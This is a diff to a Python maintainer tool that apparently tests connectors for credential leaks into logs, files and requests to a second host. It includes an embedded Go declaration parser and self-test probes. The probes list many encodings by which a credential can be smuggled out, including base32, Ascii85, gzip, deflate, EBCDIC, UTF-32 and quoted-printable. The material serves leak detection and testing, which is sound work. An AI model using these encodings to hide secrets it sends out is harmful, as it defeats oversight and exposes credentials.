-        tag = "" if v is text else " (decoded)"
-        for vv, sets, cs in ((v, needle_sets, creds), (_fold(v), fsets, fcreds)):
-            for ns in sets:
-                if ns and all(_present(vv, n) for n in ns):
-                    return "payload" + tag
-            for c in cs:
-                if _present(vv, c):
-                    return "credential" + tag
-                if len(c) > PIECE and _piece(vv, c):
-                    return "8+ character piece of the credential" + tag
-            for n in {n for ns in sets for n in ns}:
-                if segment_piece(vv, n, creds):
-                    return "a piece of the payload carrying 8+ credential characters" + tag
-    # The unit's own binary-to-text runs at every alignment (a connector that
-    # encodes and truncates a credential itself). Random bytes decoded this
-    # way would match a short credential by chance, so only 8+ are sought.
-    if len(text) < 64_000:
-        long_creds = [_fold(c) for c in creds if len(c) >= PIECE]
-        for v in aligned_decodings(text) if long_creds else ():
-            fv = _fold(v)
-            if any(_piece(fv, c) for c in long_creds):
-                return "8+ character piece of the credential (decoded at an alignment)"
-    for c in creds:
-        if len(c) >= PIECE:
-            hits = ch.leaks(text, c)
-            if hits:
-                return "decoded:" + ",".join(sorted(set(hits)))
+    m = _Matcher(creds, needle_sets, outbound, frozenset(skip))
+    try:
+        for v, texty in unit_views(text, min([PIECE] + [len(c) for c in creds])):
+            how = m.judge(v, texty)
+            if how:
+                return how + ("" if v is text else " (decoded)")
+    except _Exhausted as e:
+        return f"{e} (contract 3: withheld as a match)"
     return None
 
 
-def leaked_file(text: str, creds: list[str], needle_sets: list[list[str]]) -> str | None:
-    """Files (SQLite pages, JSONL ledgers, caches) keep the strings they were
-    given, so a large or binary file is searched for the payload, the
-    credential, any 8+ piece and its precomputed encodings directly; a small text
-    file also gets the decode views. Each of its UTF-16 readings is searched
-    the same way."""
-    for t in [text] + utf16_texts(text):
-        how = _leaked_file1(t, creds, needle_sets)
-        if how:
-            return how + ("" if t is text else " (UTF-16)")
-    return None
+def leaked_file(text: str, creds: list[str], needle_sets: list[list[str]], skip: frozenset = frozenset()) -> str | None:
+    """A file is one unit like any other: binary, large or not."""
+    return leaked(text, creds, needle_sets, skip=skip)
 
 
-def _leaked_file1(text: str, creds: list[str], needle_sets: list[list[str]]) -> str | None:
-    if len(text) < 64_000 and "\x00" not in text[:4096]:
-        return leaked(text, creds, needle_sets, utf16=False)
-    for t, f in ((text, lambda x: x), (_fold(text), _fold)):
-        for ns in needle_sets:
-            if ns and all(_present(t, f(n)) for n in ns):
-                return "payload"
-        for c in creds:
-            if len(c) > PIECE and _piece(t, f(c)):
-                return "8+ character piece of the credential"
-            for name, enc in ch.encodings(c).items():
-                if len(enc) >= 3 and _present(t, f(enc)):
-                    return f"credential({name})"
-    return None
+MAX_FILE = 16 * 1024 * 1024   # larger fails closed: it cannot be decoded within the budget
+
+# Judging a unit is CPU-bound and the cases run in threads, so units are
+# judged by worker processes (CORPUS_MATCH_PROCS of them, default one per CPU;
+# 1 judges in the calling thread), each this file run with --match-worker,
+# one JSON request and answer per line. A worker that dies fails the run.
+_POOL: dict = {"idle": None}
+_POOL_LOCK = threading.Lock()
 
 
-MAX_FILE = 512 * 1024 * 1024
+def _match_worker() -> int:
+    for line in sys.stdin:
+        q = json.loads(line)
+        how = leaked(q["text"], q["creds"], q["needle_sets"], q["outbound"], frozenset(q["skip"]))
+        sys.stdout.write(json.dumps({"how": how}) + "\n")
+        sys.stdout.flush()
+    return 0
+
+
+def judge(text: str, creds: list[str], needle_sets: list[list[str]], outbound: bool = False,
+          skip: frozenset = frozenset()) -> str | None:
+    """leaked(), in a worker process."""
+    n = int(os.environ.get("CORPUS_MATCH_PROCS") or os.cpu_count() or 1)
+    if n <= 1 or not text:
+        return leaked(text, creds, needle_sets, outbound, skip)
+    with _POOL_LOCK:
+        if _POOL["idle"] is None:
+            _POOL["idle"] = queue.Queue()
+            for _ in range(n):
+                _POOL["idle"].put(None)   # started on first use
+    w = _POOL["idle"].get()
+    try:
+        if w is None or w.poll() is not None:
+            w = subprocess.Popen([sys.executable, "-I", str(Path(__file__).resolve()), "--match-worker"],
+                                 stdin=subprocess.PIPE, stdout=subprocess.PIPE, text=True, encoding="ascii")
+        w.stdin.write(json.dumps({"text": text, "creds": creds, "needle_sets": needle_sets, "outbound": outbound,
+                                  "skip": sorted(skip)}) + "\n")
+        w.stdin.flush()
+        line = w.stdout.readline()
+        if not line:
+            raise RuntimeError("a match worker exited before answering")
+        return json.loads(line)["how"]
+    finally:
+        _POOL["idle"].put(w)
 
 
 def scan_files(home: str, unchanged: dict[str, bytes]) -> list[tuple[str, str | None, str]]:
@@ -800,19 +1267,24 @@ def read_server_json(slug: str) -> dict | None:
 
 
 # The connector's declarations are read by Go's own parser, never by text
-# matching: a comment, a string, a _test.go file or testdata that spells a
-# declaration declares nothing. This stdlib-only program (go/parser; no
-# module) walks one directory and prints {"fields": [...], "errors": [...]}:
-# every string element of `ResponseFields` in a `Declarations` composite
-# literal (or an assignment to a `.ResponseFields`) in a non-test .go file
-# outside testdata, vendor, hidden directories and the vendored kit itself. An
-# element that is not a string literal, or a file that does not parse, is an
-# error: the declarations cannot be read, so the engine refuses to run.
+# matching: a comment, a string, a _test.go file, testdata or a file the
+# build excludes declares nothing. This stdlib-only program (go/parser,
+# go/build; no module) walks one connector and prints {"fields": [...],
+# "secret_env": [...], "errors": [...]}: the string elements of
+# `ResponseFields` and `SecretEnv` in the one keyed composite literal of the
+# kit's own `Declarations` type (the package imported from <module>/internal/
+# credkit, under whatever name), elided elements of a slice, array or map of
+# it included. Anything else that names ResponseFields or SecretEnv (another
+# type's literal, an alias, an assignment, an elided element of something
+# else), a second or positional literal, a dot import of the kit, an element
+# that is not a string literal, or a file that does not parse is an error:
+# the declarations cannot be read, so the engine refuses to run.
 RESPONSE_FIELDS_GO = """package main
 
 import (
 	"encoding/json"
 	"go/ast"
+	"go/build"
 	"go/parser"
 	"go/token"
 	"io/fs"
@@ -823,51 +1295,63 @@ import (
 )
 
 type result struct {
-	Fields []string `json:"fields"`
-	Errors []string `json:"errors"`
+	Fields    []string `json:"fields"`
+	SecretEnv []string `json:"secret_env"`
+	Errors    []string `json:"errors"`
 }
+
+var watched = map[string]bool{"ResponseFields": true, "SecretEnv": true}
 
 func main() {
 	root := os.Args[1]
 	kit := filepath.Join(root, "internal", "credkit")
-	res := result{Fields: []string{}, Errors: []string{}}
+	res := result{Fields: []string{}, SecretEnv: []string{}, Errors: []string{}}
+	fail := func(f string) { res.Errors = append(res.Errors, f) }
+	mod, err := os.ReadFile(filepath.Join(root, "go.mod"))
+	if err != nil {
+		fail("no go.mod: " + err.Error())
+	}
+	kitPath := ""
+	for _, ln := range strings.Split(string(mod), "\\n") {
+		if f := strings.Fields(ln); len(f) >= 2 && f[0] == "module" {
+			if p, err := strconv.Unquote(f[1]); err == nil {
+				kitPath = p + "/internal/credkit"
+			} else {
+				kitPath = f[1] + "/internal/credkit"
+			}
+		}
+	}
+	literals := 0
 	fset := token.NewFileSet()
-	take := func(where string, v ast.Expr) {
+	take := func(where string, v ast.Expr, into *[]string) {
 		lit, ok := v.(*ast.CompositeLit)
 		if !ok {
-			res.Errors = append(res.Errors, where+": ResponseFields is not a literal")
+			fail(where + ": the declaration is not a literal")
 			return
 		}
 		for _, e := range lit.Elts {
 			b, ok := e.(*ast.BasicLit)
 			if !ok || b.Kind != token.STRING {
-				res.Errors = append(res.Errors, where+": a ResponseFields element is not a string literal")
+				fail(where + ": a declaration element is not a string literal")
 				continue
 			}
 			if s, err := strconv.Unquote(b.Value); err == nil {
-				res.Fields = append(res.Fields, s)
+				*into = append(*into, s)
 			}
 		}
 	}
-	declType := func(t ast.Expr) bool {
-		switch x := t.(type) {
-		case nil:
-			return true // an elided type inside a []Declarations literal
-		case *ast.Ident:
-			return x.Name == "Declarations"
-		case *ast.SelectorExpr:
-			return x.Sel.Name == "Declarations"
-		}
-		return false
-	}
-	err := filepath.WalkDir(root, func(p string, d fs.DirEntry, err error) error {
+	err = filepath.WalkDir(root, func(p string, d fs.DirEntry, err error) error {
 		if err != nil {
-			res.Errors = append(res.Errors, err.Error())
+			fail(err.Error())
 			return nil
 		}
 		if d.IsDir() {
 			n := d.Name()
-			if p != root && (p == kit || n == "testdata" || n == "vendor" || strings.HasPrefix(n, ".") || strings.HasPrefix(n, "_")) {
+			if p == root {
+				return nil
+			}
+			if _, e := os.Stat(filepath.Join(p, "go.mod")); e == nil || p == kit || n == "testdata" || n == "vendor" ||
+				strings.HasPrefix(n, ".") || strings.HasPrefix(n, "_") {
 				return filepath.SkipDir
 			}
 			return nil
@@ -875,37 +1359,112 @@ func main() {
 		if !strings.HasSuffix(p, ".go") || strings.HasSuffix(p, "_test.go") {
 			return nil
 		}
-		f, perr := parser.ParseFile(fset, p, nil, parser.SkipObjectResolution)
-		if perr != nil {
-			res.Errors = append(res.Errors, perr.Error())
+		if ok, e := build.Default.MatchFile(filepath.Dir(p), d.Name()); e != nil {
+			fail(e.Error())
+			return nil
+		} else if !ok {
 			return nil
 		}
+		f, perr := parser.ParseFile(fset, p, nil, parser.SkipObjectResolution)
+		if perr != nil {
+			fail(perr.Error())
+			return nil
+		}
+		names := map[string]bool{}
+		for _, im := range f.Imports {
+			if ip, _ := strconv.Unquote(im.Path.Value); ip == kitPath && kitPath != "" {
+				switch {
+				case im.Name == nil:
+					names["credkit"] = true
+				case im.Name.Name == ".":
+					fail(fset.Position(im.Pos()).String() + ": a dot import of the kit")
+				case im.Name.Name != "_":
+					names[im.Name.Name] = true
+				}
+			}
+		}
+		isKit := func(t ast.Expr) bool {
+			if s, ok := t.(*ast.StarExpr); ok {
+				t = s.X
+			}
+			sel, ok := t.(*ast.SelectorExpr)
+			if !ok || sel.Sel.Name != "Declarations" {
+				return false
+			}
+			x, ok := sel.X.(*ast.Ident)
+			return ok && names[x.Name]
+		}
+		ofKit := func(t ast.Expr) bool {
+			switch x := t.(type) {
+			case *ast.ArrayType:
+				return isKit(x.Elt)
+			case *ast.MapType:
+				return isKit(x.Value)
+			}
+			return false
+		}
+		claimed := map[ast.Node]bool{}
+		decl := func(lit *ast.CompositeLit) {
+			literals++
+			where := fset.Position(lit.Pos()).String()
+			for _, e := range lit.Elts {
+				kv, ok := e.(*ast.KeyValueExpr)
+				if !ok {
+					fail(where + ": a positional Declarations literal")
+					continue
+				}
+				if k, ok := kv.Key.(*ast.Ident); ok && watched[k.Name] {
+					claimed[k] = true
+					if k.Name == "ResponseFields" {
+						take(where, kv.Value, &res.Fields)
+					} else {
+						take(where, kv.Value, &res.SecretEnv)
+					}
+				}
+			}
+		}
 		ast.Inspect(f, func(n ast.Node) bool {
-			switch x := n.(type) {
-			case *ast.CompositeLit:
-				if !declType(x.Type) {
-					return true
-				}
-				for _, e := range x.Elts {
+			lit, ok := n.(*ast.CompositeLit)
+			if !ok {
+				return true
+			}
+			if isKit(lit.Type) {
+				decl(lit)
+			} else if ofKit(lit.Type) {
+				for _, e := range lit.Elts {
 					if kv, ok := e.(*ast.KeyValueExpr); ok {
-						if k, ok := kv.Key.(*ast.Ident); ok && k.Name == "ResponseFields" {
-							take(fset.Position(kv.Pos()).String(), kv.Value)
-						}
+						e = kv.Value
+					}
+					if u, ok := e.(*ast.UnaryExpr); ok {
+						e = u.X
+					}
+					if el, ok := e.(*ast.CompositeLit); ok && el.Type == nil {
+						decl(el)
 					}
 				}
-			case *ast.AssignStmt:
-				for i, l := range x.Lhs {
-					if sel, ok := l.(*ast.SelectorExpr); ok && sel.Sel.Name == "ResponseFields" && i < len(x.Rhs) {
-						take(fset.Position(x.Pos()).String(), x.Rhs[i])
-					}
-				}
+			}
+			return true
+		})
+		ast.Inspect(f, func(n ast.Node) bool {
+			var id *ast.Ident
+			switch x := n.(type) {
+			case *ast.KeyValueExpr:
+				id, _ = x.Key.(*ast.Ident)
+			case *ast.SelectorExpr:
+				id = x.Sel
+			}
+			if id != nil && watched[id.Name] && !claimed[id] {
+				fail(fset.Position(id.Pos()).String() + ": " + id.Name + " outside a literal of the kit's Declarations")
 			}
 			return true
 		})
 		return nil
 	})
 	if err != nil {
-		res.Errors = append(res.Errors, err.Error())
+		fail(err.Error())
+	}
+	if literals > 1 {
+		fail("more than one Declarations literal")
 	}
 	_ = json.NewEncoder(os.Stdout).Encode(res)
 }
@@ -937,29 +1496,30 @@ def _fields_helper() -> str:
         return _FIELDS_BIN["path"]
 
 
-def response_fields(slug: str) -> list[str]:
-    """The vendor response fields a connector declares as credentials (contract
-    7): the shared kit's `ResponseFields` in its declarations literal. None
-    declared means none held, and the vendor-field rows do not apply."""
+def kit_declarations(slug: str) -> dict[str, list[str]]:
+    """What a connector declares through the shared kit (contract 7): the
+    vendor response fields that carry a credential and its secret
+    environment variables. A connector without the kit declares none, so the
+    vendor-field rows do not apply."""
     try:
         cli = ch.registry.skill_path(slug) / "cli"
     except (KeyError, SystemExit):
-        return []
-    return response_fields_in(cli) if (cli / "internal" / "credkit").is_dir() else []
+        return {"fields": [], "secret_env": []}
+    return kit_declarations_in(cli) if (cli / "internal" / "credkit").is_dir() else {"fields": [], "secret_env": []}
 
 
-def response_fields_in(cli: Path) -> list[str]:
-    """Every ResponseFields string the Go code under `cli` declares. Raises
-    ValueError when a declaration cannot be read (fail closed)."""
+def kit_declarations_in(cli: Path) -> dict[str, list[str]]:
+    """The kit declarations of the Go code under `cli`. Raises ValueError when
+    they cannot be read (fail closed)."""
     try:
         p = subprocess.run([_fields_helper(), str(cli)], capture_output=True, text=True, timeout=120)
         res = json.loads(p.stdout)
     except (OSError, subprocess.TimeoutExpired, json.JSONDecodeError) as e:
         raise ValueError(f"the declaration reader failed on {cli}: {e}")
     if p.returncode != 0 or res.get("errors"):
-        raise ValueError(f"the response field declarations under {cli} cannot be read: "
+        raise ValueError(f"the kit declarations under {cli} cannot be read: "
                          f"{'; '.join(res.get('errors') or [p.stderr.strip()])[:400]}")
-    return list(dict.fromkeys(res["fields"]))
+    return {k: list(dict.fromkeys(res[k])) for k in ("fields", "secret_env")}
 
 
 def has_kit(slug: str) -> bool:
@@ -967,6 +1527,57 @@ def has_kit(slug: str) -> bool:
         return (ch.registry.skill_path(slug) / "cli" / "internal" / "credkit").is_dir()
     except (KeyError, SystemExit):
         return False
+
+
+def received(served: list, fields: list[str]) -> list[str]:
+    """Contract 1, values acquired at run time from the responses a fake sent:
+    every Set-Cookie value, and everything under a declared response field
+    (object keys too; every member of a duplicate key)."""
+    out: list[str] = []
+
+    def take(x) -> None:
+        if isinstance(x, _Pairs):
+            for k, v in x:
+                out.append(k)
+                take(v)
+        elif isinstance(x, list):
+            for v in x:
+                take(v)
+        elif x is not None and not isinstance(x, bool):
+            out.append(x if isinstance(x, str) else json.dumps(x))
+
+    def walk(x) -> None:
+        for k, v in x if isinstance(x, _Pairs) else enumerate(x if isinstance(x, list) else []):
+            if isinstance(k, str) and _declares(fields, k):
+                take(v)
+            else:
+                walk(v)
+
+    for hd, bd in served:
+        for k, v in hd.items():
+            if k.lower() == "set-cookie":
+                out.append(v.split(";", 1)[0].partition("=")[2].strip())
+        if not fields:
+            continue
+        try:
+            if "gzip" in str(hd.get("Content-Encoding", "")).lower():
+                bd = gzip.decompress(bd)
+            walk(json.loads(bd.decode("utf-8-sig"), object_pairs_hook=_Pairs))
+        except (ValueError, OSError, EOFError):
+            pass
+    return [v for v in dict.fromkeys(out) if v]
+
+
+def shared_pieces(held: list[str], others: list[str]) -> frozenset:
+    """Every PIECE-long window of a held value that is also inside one of
+    `others` (values the harness gave the program and does not hold)."""
+    out = set()
+    for h in held:
+        for i in range(len(h) - PIECE + 1):
+            w = h[i:i + PIECE]
+            if any(w in o for o in others):
+                out.add(w)
+    return frozenset(out)
 
 
 def _read_tools(ctx: ch.Ctx, tools: list[dict]) -> list[dict]:
@@ -1074,7 +1685,8 @@ def child_logging_bins(ctx: ch.Ctx, tmp: str) -> tuple[Path, Path, Path]:
 
 
 class Engine:
-    def __init__(self, ctx: ch.Ctx, tmp: str, server: dict | None = None, fields: list[str] | None = None):
+    def __init__(self, ctx: ch.Ctx, tmp: str, server: dict | None = None, fields: list[str] | None = None,
+                 secret_env: list[str] | None = None):
         self.ctx, self.tmp = ctx, tmp
         self.fields = list(fields or [])
         self.cli_bin, self.child_cli, self.mcp_bin = child_logging_bins(ctx, tmp)
@@ -1083,6 +1695,7 @@ class Engine:
         self.env_keys = ch._manifest_env_keys(ctx.manifest)
         self.plumbing = set(w.url_vars) | set(w.host_vars)
         self.declared = declared_secrets(ctx.manifest, server)
+        self.declared += [v for v in secret_env or [] if v not in self.declared]   # the kit's SecretEnv
         self.seedable = [v for v in self.declared if v not in self.plumbing]
         self.identifiers = [k for k in self.env_keys if k not in self.declared and k not in self.plumbing
                             and w.env.get(k) and not k.endswith("_NO_CONFIG_WRITE")]
@@ -1202,6 +1815,12 @@ class Engine:
         for k in list(e):
             if k.endswith("_NO_CONFIG_WRITE"):
                 e[k] = "1"
+            elif k in self.declared and k in self.ctx.wiring.url_vars and e[k]:
+                # A declared URL is held: a path of its own keeps it apart from
+                # the fake's address that every other URL variable shares.
+                scheme, _, rest = e[k].partition("://")
+                host, _, path = rest.partition("/")
+                e[k] = f"{scheme}://{host}/U{_rand(12)}" + (f"/{path}" if path else "")
             elif k in self.declared and k not in self.plumbing and e[k]:
                 # Held, so random end to end: the harness sentinels share a
                 # suffix, and a piece of it would match any other sentinel.
@@ -1416,11 +2035,19 @@ class Engine:
             # identifier, 6.4).
             adv = res["advisory"]
             num_declared = src == "vendor-field-numeric" and any(_declares(self.fields, k) for k in NUMERIC_FIELDS)
+            # Acquired at run time (contract 1): every token the fake issued,
+            # every Set-Cookie value and every declared response field value
+            # it sent, whether or not a token was ever minted.
+            got = list(dict.fromkeys(issued + received(primary.served + second.served, self.fields)))
             held = [] if (src == "each-ident" or (src == "vendor-field-numeric" and not num_declared)
-                          or (src == "minted" and cred not in issued)) else list(creds)
-            held += [env[v] for v in self.declared if env.get(v) and (v not in self.plumbing or v == var)
-                     and env[v] not in held]
-            held += [t for t in dict.fromkeys(issued) if t not in held]
+                          or (src == "minted" and cred not in got)) else list(creds)
+            held += [env[v] for v in self.declared if env.get(v) and env[v] not in held]
+            held += [t for t in got if t not in held]
+            # A piece the harness also gave the program in a value it does not
+            # hold (the fake's address, shared by every URL variable) is no
+            # evidence either way.
+            others = [v for v in env.values() if v and v not in held]
+            skip = shared_pieces(held, others)
             # An advisory row excuses only its own section 6 shape: never the
             # scientific spelling of an all-digit credential (6.2) or a
             # declared numeric field (6.3), and every other leak of a held
@@ -1432,18 +2059,20 @@ class Engine:
                 texts.append(text)
                 if adv == "6.1" and where.startswith("mcp") and where.endswith("stdout"):
                     text = strip_rpc_id(text, cred)
-                how = leaked(text, held, gated_needles)
+                how = judge(text, held, gated_needles, skip=skip)
                 if how:
                     res["where"].append(f"{where}: {how}")
             for label, h in (("", home), ("mcp ", mcp_home)):
                 for rel, text, why in scan_files(h, written):
                     texts.append(text or "")
-                    how = why if text is None else leaked_file(text, held, gated_needles)
+                    how = why if text is None else judge(text, held, gated_needles, skip=skip)
                     if how:
                         sink = "argv the MCP server gave its CLI child" if rel == CHILD_LOG else f"{label}file {rel}"
                         res["where"].append(f"{sink}: {how}")
             for (_m, path, hdrs, body) in second.requests:
-                how = leaked(request_view(path, hdrs, body), held, [[c] for c in held])
+                # Contract 2(c): any form of a whole held value, no token boundaries.
+                how = judge(request_view(path, hdrs, body), held,
+                             [[c] for c in held if not any(c in o for o in others)], outbound=True, skip=skip)
                 if how:
                     res["where"].append(f"request to a second host {path[:40]}: {how}")
             if second.unreadable:
@@ -1455,7 +2084,7 @@ class Engine:
                 # Never minted: no token was acquired, so none was held; every
                 # other held value was still checked above.
                 res["verdict"], res["note"] = "N/A", "connector never minted"
-            elif excused and (how := leaked("\n\x00\n".join(texts), [] if cred in held else [cred], needles)):
+            elif excused and (how := judge("\n\x00\n".join(texts), [] if cred in held else [cred], needles)):
                 # The exception itself, across every output of the run.
                 res["verdict"], res["where"] = "ADVISORY", [f"the run's outputs: {how}"]
             elif any(t.endswith(TIMED_OUT) for _w, t in outs):
@@ -1625,9 +2254,12 @@ def load_corpus(only: list[str] | None = None, covers: str | None = None) -> lis
 
 
 def run_cases(ctx: ch.Ctx, tmp: str, only=None, workers: int = WORKERS, covers: str | None = None,
-              server: dict | None = None, fields: list[str] | None = None) -> list[dict]:
+              server: dict | None = None, fields: list[str] | None = None,
+              secret_env: list[str] | None = None) -> list[dict]:
+    kit = kit_declarations(ctx.slug) if fields is None or secret_env is None else {}
     eng = Engine(ctx, tmp, server if server is not None else read_server_json(ctx.slug),
-                 fields if fields is not None else response_fields(ctx.slug))
+                 fields if fields is not None else kit["fields"],
+                 secret_env if secret_env is not None else kit["secret_env"])
     jobs = []
     for c in load_corpus(only, covers):
         if c.get("source") == "each-env":
@@ -1777,18 +2409,22 @@ def check_baseline(base: str | None, repo: Path | None = None, out=print) -> int
         dropped = sorted(i for i in base_ids - set(by_id) if isinstance(i, str))
         dropped += sorted(c["id"] for c in base_cases if isinstance(c.get("id"), str)
                           and c["id"] in by_id and by_id[c["id"]] != c)
-        # The engine, its encoders and the oracle helpers it imports give every
-        # case its meaning, and an added line can rebind an existing one, so
-        # any difference counts (a new encoder lands on its own first).
-        for rel_e in ("tools/maintainer/class_secret_corpus.py", "tools/maintainer/class_harness.py"):
-            if rel_c not in present:
-                continue
-            d = _git(repo, "diff", "--quiet", sha, "--", rel_e)
-            if d.returncode not in (0, 1):
-                out(f"FAIL: cannot diff {Path(rel_e).name} against {base!r}; the guard fails closed")
+        # The engine, every helper it imports and the way CI runs it give every
+        # case its meaning, and an added line anywhere among them can rebind an
+        # existing one, so a change that adds an entry may touch nothing but the
+        # list and the baseline (a new encoder lands on its own first).
+        if rel_c in present:
+            d = _git(repo, "diff", "--name-only", "-z", sha, "--")
+            u = _git(repo, "ls-files", "--others", "--exclude-standard", "-z")
+            if d.returncode != 0 or u.returncode != 0:
+                out(f"FAIL: cannot diff the tree against {base!r}; the guard fails closed")
                 return 1
-            if d.returncode == 1:
-                dropped.append(f"(a change to {Path(rel_e).name})")
+            # (Bytecode caches are written by running the tools, never imported
+            # without their source.)
+            moved = sorted({x for x in (d.stdout + u.stdout).split("\0")
+                            if x and "__pycache__/" not in f"/{x}"} - {rel_b, rel_c})
+            if moved:
+                dropped.append(f"(a change to {', '.join(moved[:3])}{' and more' if len(moved) > 3 else ''})")
         added = 0
         for slug, entries in sorted(head.items()):
             for e in sorted(entries - base_line.get(slug, set())):
@@ -1797,8 +2433,9 @@ def check_baseline(base: str | None, repo: Path | None = None, out=print) -> int
                     bad.append(f"{slug}: {e}: added for case {cid}, which the base already has; the baseline only "
                                f"shrinks (fix the connector instead)")
                 elif dropped:
-                    bad.append(f"{slug}: {e}: added in a change that drops or rewords {dropped} of the base; a "
-                               f"renamed case is an existing case (land that change on its own)")
+                    bad.append(f"{slug}: {e}: added in a change that also drops, rewords or changes {dropped}; a "
+                               f"new case's entries land in a change to only the list and the baseline (land the "
+                               f"rest on its own first)")
                 else:
                     added += 1
         removed = sum(len(v - head.get(s, set())) for s, v in base_line.items())
@@ -2467,9 +3104,12 @@ import urllib.parse
 _SECRET = {"ACME_CLIENT_SECRET": "${user_config.client_secret}"}
 
 
-def _verdicts(case: str, kw: dict, fields: list[str] | None = None) -> list[dict]:
+def _verdicts(case: str, kw: dict, fields: list[str] | dict | None = None) -> list[dict]:
+    """`fields` is the declared response fields, or a dict of run_cases
+    keyword arguments (fields, secret_env)."""
+    run_kw = fields if isinstance(fields, dict) else {"fields": fields or []}
     with tempfile.TemporaryDirectory(prefix="corpus-r2-") as tmp:
-        return run_cases(_fx(tmp, **kw), tmp, only=[case], server={}, fields=fields or [])
+        return run_cases(_fx(tmp, **kw), tmp, only=[case], server={}, **run_kw)
 
 
 def _probes(name: str, probes: list) -> bool:
@@ -2477,7 +3117,10 @@ def _probes(name: str, probes: list) -> bool:
     for why, case, want, kw, *fields in probes:
         if want == "FAIL-UNLESS-ROOT":
             want = "PASS" if os.geteuid() == 0 else "FAIL"
-        got = _verdicts(case, kw, fields[0] if fields else None)
+        try:
+            got = _verdicts(case, kw, fields[0] if fields else None)
+        except Exception as e:  # noqa: BLE001 - a probe that cannot run is a failed probe
+            got = [{"id": case, "verdict": f"error {e!r}"[:200], "where": [], "note": ""}]
         if {r["verdict"] for r in got} != {want}:
             print(f"    corpus self-test: {name}: {why} ({case}): want {want}, got "
                   f"{[(r['id'], r['verdict'], r['where'][:2], r['note']) for r in got]}")
@@ -2540,13 +3183,15 @@ def _r2_response_fields() -> bool:
     comment, a string, a _test.go file or testdata."""
     ok = True
     decl = 'var D = credkit.Declarations{SecretEnv: []string{"X"}, ResponseFields: []string{%s}}\n'
+    imp = 'import "acme/internal/credkit"\n\n'
     files = {
+        "go.mod": "module acme\n",
         "internal/credkit/kit.go": "package credkit\n\ntype Declarations struct{ ResponseFields []string }\n",
         "main.go": ('package main\n\n// credkit.Declarations{ResponseFields: []string{"name"}}\n'
                     'var s = "credkit.Declarations{ResponseFields: []string{\\"title\\"}}"\n'
                     '/* ResponseFields: []string{"note"} */\nfunc main() {}\n'),
-        "main_test.go": "package main\n\n" + decl % '"description"',
-        "testdata/fx.go": "package fx\n\n" + decl % '"message"',
+        "main_test.go": "package main\n\n" + imp + decl % '"description"',
+        "testdata/fx.go": "package fx\n\n" + imp + decl % '"message"',
     }
 
     def fields(extra: dict[str, str]):
@@ -2556,15 +3201,15 @@ def _r2_response_fields() -> bool:
                 p.parent.mkdir(parents=True, exist_ok=True)
                 p.write_text(body, encoding="utf-8")
             try:
-                return sorted(response_fields_in(Path(tmp)))
+                return sorted(kit_declarations_in(Path(tmp))["fields"])
             except ValueError as e:
                 return f"error: {e}"
 
     for extra, want, why in (
             ({}, [], "only comments, strings, a _test.go file and testdata declare fields"),
-            ({"wire.go": "package main\n\n" + decl % '"password", `session_id`'}, ["password", "session_id"],
+            ({"wire.go": "package main\n\n" + imp + decl % '"password", `session_id`'}, ["password", "session_id"],
              "a real declaration (a raw string included)"),
-            ({"wire.go": "package main\n\nconst f = \"x\"\n\n" + decl % "f"}, "error",
+            ({"wire.go": "package main\n\n" + imp + "const f = \"x\"\n\n" + decl % "f"}, "error",
              "a declaration whose element is not a string literal fails closed")):
         got = fields(extra)
         if (got if want != "error" else str(got).split(":")[0]) != want:
@@ -2661,6 +3306,230 @@ R2_PROBES = {"held-set-runtime-tokens": _r2_held_set, "advisory-exception-scope"
              "sink-capture": _r2_sink_capture, "update-baseline-advisory": _r2_update_baseline}
 
 
+# Round 3 (the fresh review): one probe set per class, both directions.
+def _oracle_probes(name: str, probes: list) -> bool:
+    ok = True
+    for text, creds, hit, why, *rest in probes:
+        try:
+            got = bool((leaked_file if rest and rest[0] == "file" else leaked)(text, creds, rest[1] if len(rest) > 1 else []))
+        except Exception as e:  # noqa: BLE001 - a probe that cannot run is a failed probe
+            got = f"error {e!r}"[:200]
+        if got != hit:
+            print(f"    corpus self-test: {name}: oracle {'missed' if hit else 'false positive on'} {why} (got {got})")
+            ok = False
+    return ok
+
+
+def _u(b: bytes) -> str:
+    """Bytes as a sink unit carries them (read with surrogateescape)."""
+    return b.decode("utf-8", "surrogateescape")
+
+
+def _r3_decoders() -> bool:
+    """Contract 3 on the WHOLE unit, recursively, whatever the connector itself
+    encoded: every decoder, at every offset, both readings of decoded bytes,
+    whole short credentials, joined values and integer spellings. And the
+    other direction: credential-free output of every shape matches nothing."""
+    import random
+    import zlib
+    d8, d6, s3 = "48291375", "482913", "q7Z"
+    cred = make_cred("long")
+    raw = cred.encode()
+    deflate = zlib.compressobj(wbits=-15)
+    bold = "".join(chr(0x1D7CE + int(x)) for x in d8)
+    payload = base64.b32encode(b"ABC!DEFG").decode()
+    long_payload = base64.b32encode(raw).decode()
+    ok = _oracle_probes("whole-unit decoders", [
+        (base64.b32encode(base64.b32encode(d8.encode())).decode(), [d8], True, "double base32 of a digit credential"),
+        ("uuuuu" + base64.a85encode(d8.encode()).decode() + "uuuuu", [d8], True, "Ascii85 after an invalid block"),
+        (base64.b32encode(ENC["fullwidth"](cred).encode()).decode(), [cred], True, "base32 of fullwidth UTF-8 bytes"),
+        ("id " + base64.b32encode(s3.encode()).decode() + " ok", [s3], True, "base32 of a whole 3-character credential"),
+        (json.dumps(list(cred)), [cred], True, "the credential split into adjacent JSON strings"),
+        (json.dumps({"a": ["q", "7Z"]}), [s3], True, "a short credential split across adjacent JSON strings"),
+        ("n=000482913", [d6], True, "leading zeros"), ("n=482,913", [d6], True, "digit grouping"),
+        ("n=482 913", [d6], True, "digit grouping with a space"), ("n=4.82913e5", [d6], True, "scientific notation"),
+        ("n=4.82913E+05", [d6], True, "scientific notation, upper case"),
+        ("n=1482913", [d6], False, "a longer number"), ("n=48291", [d6], False, "a shorter number"),
+        ("n=4829130", [d6], False, "another integer"),
+        (_u(b"x" + gzip.compress(raw) + b"tail"), [cred], True, "gzip with trailing bytes"),
+        (_u(b"x" + zlib.compress(raw)), [cred], True, "zlib"),
+        (_u(b"x" + deflate.compress(raw) + deflate.flush() + b"tail"), [cred], True, "raw deflate"),
+        (_u(cred.encode("cp037")), [cred], True, "EBCDIC (a charset of golang.org/x/text/encoding)"),
+        ("=?cp037?B?" + base64.b64encode(cred.encode("cp037")).decode() + "?=", [cred], True, "a MIME B word in EBCDIC"),
+        (_u(b"x" + cred.encode("utf-32-le")), [cred], True, "UTF-32LE"),
+        ("".join(f"\\U{ord(c):08X}" for c in cred), [cred], True, "Go/TOML \\U escapes"),
+        ("".join(f"={b:02X}" for b in raw[:10]) + "=\r\n" + "".join(f"={b:02X}" for b in raw[10:]), [cred], True,
+         "quoted-printable with a soft line break"),
